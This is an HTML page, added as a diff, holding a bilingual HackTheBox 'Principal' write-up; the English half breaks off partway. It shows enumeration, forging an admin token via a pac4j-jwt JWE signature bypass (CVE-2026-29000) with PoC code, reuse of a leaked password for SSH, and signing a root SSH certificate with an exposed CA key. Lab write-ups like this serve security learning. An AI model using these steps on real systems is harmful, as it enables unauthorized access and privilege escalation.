@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>principal | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">principal</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ==================== SPANISH ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina expone un portal web en el puerto 8080 construido con Spring Boot y protegido por
+                        <strong>pac4j-jwt 6.0.3</strong>. Esta versión concreta es vulnerable a
+                        <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29000">CVE-2026-29000</a>, un bypass de
+                        autenticación que permite forjar tokens JWE arbitrarios usando únicamente la clave pública RSA
+                        del servidor, ya que el backend no verifica la firma del JWT interno. El endpoint
+                        <code>/api/auth/jwks</code> expone dicha clave pública de forma abierta, lo que convierte el
+                        ataque en algo completamente sin credenciales.</p>
+
+                    <p>Con un token forjado como <code>ROLE_ADMIN</code> accedo a los endpoints privilegiados de la
+                        API. El endpoint <code>/api/settings</code> filtra directamente una credencial en texto claro
+                        (<code>encryptionKey</code>) que resulta ser la contraseña SSH del usuario de servicio
+                        <code>svc-deploy</code>, con la que obtengo acceso inicial a la máquina.</p>
+
+                    <p>Una vez dentro, descubro que <code>svc-deploy</code> pertenece al grupo <code>deployers</code>,
+                        que tiene permisos de lectura sobre el directorio <code>/opt/principal/ssh/</code>. Este
+                        directorio contiene la <strong>clave privada de la CA de SSH</strong> del sistema. La
+                        configuración de <code>sshd</code> en <code>TrustedUserCAKeys</code> apunta a esta CA, lo que
+                        significa que cualquier certificado firmado por ella es aceptado para autenticación. Genero una
+                        clave RSA local, la firmo con la CA para el usuario <code>root</code> y obtengo acceso
+                        privilegiado completo mediante SSH.</p>
+
+                    <p><strong>Tecnologías / Exploits:</strong> pac4j-jwt 6.0.3 JWE token forgery (CVE-2026-29000),
+                        filtrado de credenciales en endpoint de configuración, escalada de privilegios mediante
+                        certificate authority SSH comprometida.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar los puertos y servicios expuestos en la máquina
+                    objetivo:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#56b6c2;">PORT</span>      <span style="color:#56b6c2;">STATE</span>  <span style="color:#56b6c2;">SERVICE</span>      <span style="color:#56b6c2;">VERSION</span>
+<span style="color:#98c379;">22/tcp</span>    open   ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
+|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
+<span style="color:#98c379;">8080/tcp</span>  open   http-proxy   Jetty
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Jetty
+| http-title: Principal Internal Platform - Login
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 404 Not Found
+|     Server: Jetty
+|     <span style="color:#e5c07b;">X-Powered-By: pac4j-jwt/6.0.3</span>
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: application/json
+|_    {"timestamp":"...","status":404,"error":"Not Found","path":"..."}</code></pre>
+
+                <p>Solo dos puertos abiertos: SSH en el 22 y un servidor HTTP (Jetty) en el 8080. La cabecera
+                    <code>X-Powered-By: pac4j-jwt/6.0.3</code> es inmediatamente llamativa, ya que revela la versión
+                    exacta del framework de autenticación.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Lanzo <code>whatweb</code> contra el servicio HTTP para obtener más contexto tecnológico:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">whatweb</span> http://10.129.244.220:8080/login</code></pre>
+
+                <pre><code class="language-plaintext">http://10.129.244.220:8080/login [200 OK] Content-Language[en], HTML5,
+HTTPServer[Jetty], PasswordField[password],
+<span style="color:#e5c07b;">PoweredBy[pac4j], X-Powered-By[pac4j-jwt/6.0.3]</span>,
+Title[Principal Internal Platform - Login]</code></pre>
+
+                <p>Confirma el stack. Al intentar acceder a una ruta inexistente, obtengo una página de error
+                    característica de <strong>Spring Boot</strong>:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">Whitelabel Error Page</span>
+This application has no explicit mapping for /error, so you are seeing this as a fallback.
+There was an unexpected error (type=Not Found, status=404).</code></pre>
+
+                <p>Con un diccionario específico de Spring Boot hago fuzzing y descubro varias rutas interesantes, aunque
+                    todas requieren autenticación:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">gobuster</span> dir -u <span style="color:#98c379;">"http://10.129.244.220:8080"</span> \
+  -w <span style="color:#98c379;">"/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt"</span> \
+  -t 200 -x html,jsp</code></pre>
+
+                <pre><code class="language-plaintext">api/actuator/env/language.jsp   (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator/env.jsp            (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator/env                (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator.html               (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator/env/hostname       (Status: <span style="color:#e06c75;">401</span>) [Size: 58]</code></pre>
+
+                <p>Con un diccionario más genérico aparecen rutas adicionales:</p>
+
+                <pre><code class="language-plaintext">login           (Status: <span style="color:#98c379;">200</span>) [Size: 6152]
+error           (Status: <span style="color:#e06c75;">500</span>) [Size: 73]
+WEB-INF         (Status: <span style="color:#e06c75;">500</span>) [Size: 0]
+dashboard       (Status: <span style="color:#98c379;">200</span>) [Size: 3930]
+META-INF        (Status: <span style="color:#e06c75;">500</span>) [Size: 0]
+web-inf         (Status: <span style="color:#e06c75;">500</span>) [Size: 0]
+reset-password  (Status: <span style="color:#e5c07b;">501</span>) [Size: 110]</code></pre>
+
+                <p>Usando Burp Suite para interceptar la redirección del navegador antes de que llegue a
+                    <code>/login</code>, puedo ver el contenido del <code>/dashboard</code> brevemente:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Vista del dashboard de la aplicación capturada con Burp Suite antes de la redirección al login, mostrando la interfaz principal de la plataforma" /></p>
+
+                <h3>Análisis del JavaScript del Frontend</h3>
+                <p>El código JavaScript cargado en la página de login no está ofuscado. Inspeccionándolo encuentro
+                    constantes con rutas y definiciones de roles del lado del servidor, lo que es muy útil para mapear
+                    la superficie de ataque:</p>
+
+                <pre><code class="language-javascript"><span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">API_BASE</span> = <span style="color:#98c379;">''</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">JWKS_ENDPOINT</span>      = <span style="color:#98c379;">'/api/auth/jwks'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">AUTH_ENDPOINT</span>      = <span style="color:#98c379;">'/api/auth/login'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">DASHBOARD_ENDPOINT</span> = <span style="color:#98c379;">'/api/dashboard'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">USERS_ENDPOINT</span>     = <span style="color:#98c379;">'/api/users'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">SETTINGS_ENDPOINT</span>  = <span style="color:#98c379;">'/api/settings'</span>;
+
+<span style="color:#7f848e;">// Role constants - must match server-side role definitions</span>
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">ROLES</span> = {
+    <span style="color:#e06c75;">ADMIN</span>:   <span style="color:#98c379;">'ROLE_ADMIN'</span>,
+    <span style="color:#e06c75;">MANAGER</span>: <span style="color:#98c379;">'ROLE_MANAGER'</span>,
+    <span style="color:#e06c75;">USER</span>:    <span style="color:#98c379;">'ROLE_USER'</span>
+};
+
+<span style="color:#c678dd;">function</span> <span style="color:#61afef;">renderNavigation</span>(role) {
+    <span style="color:#c678dd;">const</span> navItems = [
+        { label: <span style="color:#98c379;">'Dashboard'</span>, endpoint: DASHBOARD_ENDPOINT, roles: [ROLES.ADMIN, ROLES.MANAGER, ROLES.USER] },
+        { label: <span style="color:#98c379;">'Users'</span>,     endpoint: USERS_ENDPOINT,     roles: [ROLES.ADMIN] },
+        { label: <span style="color:#98c379;">'Settings'</span>,  endpoint: SETTINGS_ENDPOINT,  roles: [ROLES.ADMIN] },
+    ];
+    <span style="color:#c678dd;">return</span> navItems.<span style="color:#61afef;">filter</span>(item =&gt; item.roles.<span style="color:#61afef;">includes</span>(role));
+}</code></pre>
+
+                <p>Queda claro que los endpoints <code>/api/users</code> y <code>/api/settings</code> son exclusivos de
+                    <code>ROLE_ADMIN</code>. El objetivo es conseguir un token con ese rol.</p>
+
+                <p>Haciendo fuzzing también bajo <code>/api</code> y <code>/api/auth</code>, descubro además el endpoint
+                    <code>/api/health</code> que responde públicamente:</p>
+
+                <pre><code class="language-json">{<span style="color:#98c379;">"status"</span>:<span style="color:#98c379;">"UP"</span>,<span style="color:#98c379;">"version"</span>:<span style="color:#98c379;">"1.2.0"</span>}</code></pre>
+
+                <h3>El Endpoint JWKS</h3>
+                <p>Durante la inspección con Burp Suite había visto una petición a <code>/api/auth/jwks</code>. Este
+                    endpoint es habitual en implementaciones JWT/JWE y expone la clave pública RSA del servidor:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"keys"</span>: [{
+    <span style="color:#98c379;">"kty"</span>: <span style="color:#98c379;">"RSA"</span>,
+    <span style="color:#98c379;">"e"</span>:   <span style="color:#98c379;">"AQAB"</span>,
+    <span style="color:#98c379;">"kid"</span>: <span style="color:#98c379;">"enc-key-1"</span>,
+    <span style="color:#98c379;">"n"</span>:   <span style="color:#98c379;">"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"</span>
+  }]
+}</code></pre>
+
+                <p>Esta clave pública, combinada con la vulnerabilidad que descubriré a continuación, es la pieza clave
+                    del ataque.</p>
+
+                <h2>Investigación de la Vulnerabilidad — CVE-2026-29000</h2>
+                <p>Busco información sobre <code>pac4j-jwt/6.0.3</code> y encuentro rápidamente un CVE activo:
+                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29000">CVE-2026-29000</a>.</p>
+
+                <blockquote>
+                    <p>"pac4j-jwt versions prior to 4.5.9, 5.7.9, and 6.3.3 contain an authentication bypass
+                        vulnerability in JwtAuthenticator when processing encrypted JWTs that allows remote attackers
+                        to forge authentication tokens. Attackers who possess the server's RSA public key can create a
+                        JWE-wrapped PlainJWT with arbitrary subject and role claims, bypassing signature verification
+                        to authenticate as any user including administrators."</p>
+                </blockquote>
+
+                <p>La clave pública que expone el endpoint JWKS es exactamente lo que necesita el ataque.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad es una variante de <em>algorithm confusion</em> o <code>alg: none</code>. El flujo
+                    normal sería: el servidor emite un JWT firmado con su clave privada RSA (RS256), y al recibirlo de
+                    vuelta verifica esa firma para garantizar autenticidad.</p>
+
+                <p>El problema es que cuando el JWT llega envuelto en un JWE (JSON Web Encryption), el servidor lo
+                    descifra correctamente usando su clave privada, pero luego <strong>no verifica la firma del JWT
+                    interno</strong>. Esto significa que un atacante puede crear un <code>PlainJWT</code> (sin firma,
+                    <code>alg: none</code>) con los claims que quiera, envolverlo en un JWE cifrado con la clave pública
+                    del servidor (que está pública en <code>/api/auth/jwks</code>), y el servidor lo aceptará como
+                    válido.</p>
+
+                <h2>Forjando el Token de Administrador</h2>
+                <p>Localizo una PoC para este CVE en GitHub:
+                    <a href="https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc/blob/main/poc.py">CVE-2026-29000 Python PoC</a>.
+                    El script acepta la URL del endpoint JWKS, el usuario y el rol deseados:</p>
+
+                <pre><code class="language-plaintext">parser.add_argument("--jwks", required=True, help="JWKS endpoint URL")
+parser.add_argument("--user", default="admin",      help="Username (sub claim)")
+parser.add_argument("--role", default="ROLE_ADMIN", help="Role claim")</code></pre>
+
+                <p>Internamente, el script coge la clave pública del JWKS y cifra un <code>PlainJWT</code> con los
+                    claims indicados en un JWE usando <code>RSA-OAEP-256</code> y <code>A128GCM</code>:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">def</span> <span style="color:#61afef;">build_jwe</span>(plain_jwt, jwks_key):
+    <span style="color:#98c379;">"""Encrypt PlainJWT into JWE"""</span>
+    public_key = jwk.JWK.<span style="color:#61afef;">from_json</span>(json.<span style="color:#61afef;">dumps</span>(jwks_key))
+    protected_header = {
+        <span style="color:#98c379;">"alg"</span>: <span style="color:#98c379;">"RSA-OAEP-256"</span>,
+        <span style="color:#98c379;">"enc"</span>: <span style="color:#98c379;">"A128GCM"</span>,
+        <span style="color:#98c379;">"cty"</span>: <span style="color:#98c379;">"JWT"</span>,
+        <span style="color:#98c379;">"kid"</span>: jwks_key[<span style="color:#98c379;">"kid"</span>]
+    }
+    token = jwe.<span style="color:#61afef;">JWE</span>(
+        plain_jwt.<span style="color:#61afef;">encode</span>(),
+        protected=json.<span style="color:#61afef;">dumps</span>(protected_header)
+    )
+    token.<span style="color:#61afef;">add_recipient</span>(public_key)
+    <span style="color:#c678dd;">return</span> token.<span style="color:#61afef;">serialize</span>(compact=<span style="color:#e5c07b;">True</span>)</code></pre>
+
+                <p>El servidor descifra el JWE correctamente (tiene la clave privada), pero al no verificar la firma
+                    del JWT interior acepta el <code>PlainJWT</code> con los claims arbitrarios. Ejecuto el script:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">python3</span> cve.py --jwks http://10.129.244.220:8080/api/auth/jwks</code></pre>
+
+                <pre><code class="language-plaintext">[*] Fetching JWKS...
+[+] Public key loaded
+[+] PlainJWT created
+
+=== Malicious JWE Token ===
+eyJhbGciOiAi...
+
+Use it as:
+  Authorization: Bearer eyJhbGci...</code></pre>
+
+                <h2>Acceso a los Endpoints Privilegiados</h2>
+                <p>Con el token forjado añado la cabecera <code>Authorization: Bearer &lt;token&gt;</code> a las
+                    peticiones. Primero compruebo <code>/api/dashboard</code>, que confirma que el bypass funciona y
+                    muestra actividad reciente, usuarios del sistema y estadísticas. Hay una anotación interesante en
+                    los anuncios:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"announcements"</span>: [
+    {
+      <span style="color:#98c379;">"severity"</span>: <span style="color:#98c379;">"warning"</span>,
+      <span style="color:#98c379;">"date"</span>: <span style="color:#98c379;">"2025-12-15"</span>,
+      <span style="color:#98c379;">"message"</span>: <span style="color:#98c379;">"SSH CA keys have been rotated. All deploy certificates issued before Dec 1 are revoked."</span>,
+      <span style="color:#98c379;">"title"</span>: <span style="color:#98c379;">"New SSH CA Rotation"</span>
+    }
+  ]
+}</code></pre>
+
+                <p>Interesante: mencionan una CA de SSH para certificados de despliegue. Lo tengo en mente para después.
+                    Ahora consulto <code>/api/users</code> para mapear todos los usuarios del sistema:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"users"</span>: [
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"admin"</span>,      <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_ADMIN"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"IT Security"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"svc-deploy"</span>, <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"deployer"</span>,    <span style="color:#98c379;">"note"</span>: <span style="color:#e5c07b;">"Service account for automated deployments via SSH certificate auth."</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"jthompson"</span>,  <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_USER"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Engineering"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"amorales"</span>,   <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_USER"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Engineering"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"bwright"</span>,    <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_MANAGER"</span>,<span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Operations"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"kkumar"</span>,     <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_ADMIN"</span>,  <span style="color:#98c379;">"active"</span>: <span style="color:#e06c75;">false</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"mwilson"</span>,    <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_USER"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"QA"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"lzhang"</span>,     <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_MANAGER"</span>,<span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Engineering"</span> }
+  ],
+  <span style="color:#98c379;">"total"</span>: <span style="color:#e5c07b;">8</span>
+}</code></pre>
+
+                <p>El usuario <code>svc-deploy</code> destaca: es una cuenta de servicio para despliegues automatados
+                    via SSH. Finalmente consulto <code>/api/settings</code>:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"system"</span>: {
+    <span style="color:#98c379;">"applicationName"</span>: <span style="color:#98c379;">"Principal Internal Platform"</span>,
+    <span style="color:#98c379;">"javaVersion"</span>: <span style="color:#98c379;">"21.0.10"</span>,
+    <span style="color:#98c379;">"serverType"</span>: <span style="color:#98c379;">"Jetty 12.x (Embedded)"</span>
+  },
+  <span style="color:#98c379;">"security"</span>: {
+    <span style="color:#98c379;">"authFramework"</span>:        <span style="color:#98c379;">"pac4j-jwt"</span>,
+    <span style="color:#98c379;">"authFrameworkVersion"</span>: <span style="color:#98c379;">"6.0.3"</span>,
+    <span style="color:#98c379;">"jwtAlgorithm"</span>:         <span style="color:#98c379;">"RS256"</span>,
+    <span style="color:#98c379;">"jweAlgorithm"</span>:         <span style="color:#98c379;">"RSA-OAEP-256"</span>,
+    <span style="color:#98c379;">"jweEncryption"</span>:        <span style="color:#98c379;">"A128GCM"</span>,
+    <span style="color:#98c379;">"encryptionKey"</span>:        <span style="color:#e5c07b;">"D3pl0y_$$H_Now42!"</span>,
+    <span style="color:#98c379;">"tokenExpiry"</span>:          <span style="color:#98c379;">"3600s"</span>
+  },
+  <span style="color:#98c379;">"infrastructure"</span>: {
+    <span style="color:#98c379;">"sshCertAuth"</span>: <span style="color:#98c379;">"enabled"</span>,
+    <span style="color:#98c379;">"sshCaPath"</span>:   <span style="color:#98c379;">"/opt/principal/ssh/"</span>,
+    <span style="color:#98c379;">"notes"</span>:       <span style="color:#98c379;">"SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."</span>
+  }
+}</code></pre>
+
+                <p>El campo <code>encryptionKey</code> filtra directamente una credencial en texto claro. Por el nombre
+                    del parámetro y el usuario de servicio que hemos visto antes, la asociación es obvia:
+                    <code>svc-deploy : D3pl0y_$$H_Now42!</code>.</p>
+
+                <p>Además, la sección <code>infrastructure</code> confirma que la CA de SSH está en
+                    <code>/opt/principal/ssh/</code>, dato que será crucial para la escalada.</p>
+
+                <h2>Acceso Inicial — SSH como svc-deploy</h2>
+                <p>Pruebo la credencial encontrada en el servicio SSH:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh</span> svc-deploy@10.129.244.220</code></pre>
+
+                <p>Funciona. Obtengo acceso al sistema y la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios — SSH Certificate Authority Comprometida</h2>
+                <p>Compruebo a qué grupos pertenece el usuario actual:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">id</span></code></pre>
+
+                <pre><code class="language-plaintext">uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(<span style="color:#e5c07b;">deployers</span>)</code></pre>
+
+                <p>El grupo <code>deployers</code> es un grupo personalizado. Busco qué ficheros le pertenecen:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">find</span> / -group deployers 2&gt;/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/etc/ssh/sshd_config.d/60-principal.conf
+/opt/principal/ssh
+/opt/principal/ssh/README.txt
+<span style="color:#e5c07b;">/opt/principal/ssh/ca</span></code></pre>
+
+                <p>El fichero <code>ca</code> es la clave privada de la Certificate Authority de SSH. Antes de
+                    explotarla, reviso la configuración de sshd y el README para entender el contexto:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">cat</span> /opt/principal/ssh/README.txt</code></pre>
+
+                <pre><code class="language-plaintext">CA keypair for SSH certificate automation.
+This CA is trusted by sshd for certificate-based authentication.
+Use deploy.sh to issue short-lived certificates for service accounts.
+
+Key details:
+  Algorithm: RSA 4096-bit
+  Created:   2025-11-15
+  Purpose:   Automated deployment authentication</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">cat</span> /etc/ssh/sshd_config.d/60-principal.conf</code></pre>
+
+                <pre><code class="language-plaintext"># Principal machine SSH configuration
+PubkeyAuthentication   yes
+PasswordAuthentication yes
+PermitRootLogin        prohibit-password
+<span style="color:#e5c07b;">TrustedUserCAKeys      /opt/principal/ssh/ca.pub</span></code></pre>
+
+                <p>La directiva <code>TrustedUserCAKeys</code> le dice a sshd que confíe en cualquier certificado
+                    firmado por la CA cuya clave pública está en <code>/opt/principal/ssh/ca.pub</code>. Como tenemos
+                    acceso de lectura a la clave <strong>privada</strong> en <code>/opt/principal/ssh/ca</code>, podemos
+                    firmar cualquier certificado que queramos, incluyendo uno para <code>root</code>.</p>
+
+                <p>La directiva <code>PermitRootLogin prohibit-password</code> impide el login de root con contraseña,
+                    pero <strong>no</strong> impide el login de root con certificado o clave pública. La CA lo cubre.</p>
+
+                <h3>Forjando el Certificado SSH para root</h3>
+                <p>Copio la clave privada de la CA a mi máquina atacante. Luego genero un nuevo par de claves RSA para
+                    un usuario ficticio (<code>pwned</code>):</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh-keygen</span> -t rsa -f pwned</code></pre>
+
+                <p>Esto genera los ficheros <code>pwned</code> (clave privada) y <code>pwned.pub</code> (clave
+                    pública). Ahora firmo la clave pública con la CA, especificando el principal
+                    <code>root</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh-keygen</span> -s ca -I <span style="color:#98c379;">"pwned"</span> -n root -V +1h pwned.pub</code></pre>
+
+                <p>Los parámetros relevantes:</p>
+                <ul>
+                    <li><code>-s ca</code> — clave privada de la CA con la que firmar</li>
+                    <li><code>-I "pwned"</code> — identificador del certificado (puede ser cualquier cadena)</li>
+                    <li><code>-n root</code> — principal: el usuario para el que es válido el certificado</li>
+                    <li><code>-V +1h</code> — validez de una hora</li>
+                </ul>
+
+                <p>El comando genera el fichero <code>pwned-cert.pub</code>. Doy los permisos correctos a la clave
+                    privada:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">chmod</span> 600 pwned</code></pre>
+
+                <p>Por último, conecto al objetivo como <code>root</code> usando el certificado:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh</span> -i pwned root@10.129.244.220</code></pre>
+
+                <p>SSH selecciona automáticamente el certificado <code>pwned-cert.pub</code> asociado a la clave
+                    privada <code>pwned</code>. sshd verifica que el certificado está firmado por la CA de confianza y
+                    que el principal incluye <code>root</code>, concediendo acceso. Obtengo la flag de root y completo
+                    la máquina.</p>
+            </div>
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The machine exposes a web portal on port 8080 built with Spring Boot and protected by
+                        <strong>pac4j-jwt 6.0.3</strong>. This specific version is vulnerable to
+                        <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29000">CVE-2026-29000</a>, an
+                        authentication bypass that allows forging arbitrary JWE tokens using only the server's RSA
+                        public key, since the backend does not verify the signature of the inner JWT. The
+                        <code>/api/auth/jwks</code> endpoint exposes that public key openly, making the attack fully
+                        unauthenticated.</p>
+
+                    <p>With a forged <code>ROLE_ADMIN</code> token I access the privileged API endpoints. The
+                        <code>/api/settings</code> endpoint leaks a plaintext credential (<code>encryptionKey</code>)
+                        which turns out to be the SSH password for the <code>svc-deploy</code> service account,
+                        granting initial foothold on the machine.</p>
+
+                    <p>Once inside, I find that <code>svc-deploy</code> belongs to the <code>deployers</code> group,
+                        which has read access to <code>/opt/principal/ssh/</code>. This directory contains the
+                        system's <strong>SSH CA private key</strong>. The <code>sshd</code> configuration sets
+                        <code>TrustedUserCAKeys</code> to this CA, meaning any certificate signed by it is accepted
+                        for authentication. I generate a local RSA key pair, sign it with the CA for the
+                        <code>root</code> principal, and gain full privileged access via SSH.</p>
+
+                    <p><strong>Technologies / Exploits:</strong> pac4j-jwt 6.0.3 JWE token forgery (CVE-2026-29000),
+                        credential leakage through settings endpoint, privilege escalation via compromised SSH
+                        certificate authority.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#56b6c2;">PORT</span>      <span style="color:#56b6c2;">STATE</span>  <span style="color:#56b6c2;">SERVICE</span>      <span style="color:#56b6c2;">VERSION</span>
+<span style="color:#98c379;">22/tcp</span>    open   ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
+|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
+<span style="color:#98c379;">8080/tcp</span>  open   http-proxy   Jetty
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Jetty
+| http-title: Principal Internal Platform - Login
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 404 Not Found
+|     Server: Jetty
+|     <span style="color:#e5c07b;">X-Powered-By: pac4j-jwt/6.0.3</span>
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: application/json
+|_    {"timestamp":"...","status":404,"error":"Not Found","path":"..."}</code></pre>
+
+                <p>Only two open ports: SSH on 22 and an HTTP server (Jetty) on 8080. The
+                    <code>X-Powered-By: pac4j-jwt/6.0.3</code> header immediately stands out, revealing the exact
+                    version of the authentication framework in use.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Running <code>whatweb</code> against the HTTP service for additional technology context:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">whatweb</span> http://10.129.244.220:8080/login</code></pre>
+
+                <pre><code class="language-plaintext">http://10.129.244.220:8080/login [200 OK] Content-Language[en], HTML5,
+HTTPServer[Jetty], PasswordField[password],
+<span style="color:#e5c07b;">PoweredBy[pac4j], X-Powered-By[pac4j-jwt/6.0.3]</span>,
+Title[Principal Internal Platform - Login]</code></pre>
+
+                <p>Confirmed. Visiting a non-existent path returns a typical <strong>Spring Boot</strong> Whitelabel
+                    error page:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">Whitelabel Error Page</span>
+This application has no explicit mapping for /error, so you are seeing this as a fallback.
+There was an unexpected error (type=Not Found, status=404).</code></pre>
+
+                <p>Fuzzing with a Spring Boot-specific wordlist reveals several endpoints, all requiring
+                    authentication:</p>
+
